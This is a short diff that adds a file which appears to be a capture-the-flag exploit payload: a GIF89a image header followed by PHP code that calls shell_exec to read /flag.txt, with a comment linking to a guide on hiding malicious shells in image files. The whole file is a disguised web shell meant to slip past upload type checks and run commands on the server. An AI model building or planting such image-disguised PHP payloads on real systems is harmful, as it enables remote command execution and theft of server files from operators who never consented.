@@ -1,0 +1,5 @@
+GIF89a;
+<?php
+  echo shell_exec("cat /flag.txt");
+  // https://rcenetsec.com/hide-malicious-shell-in-image-file/
+?>
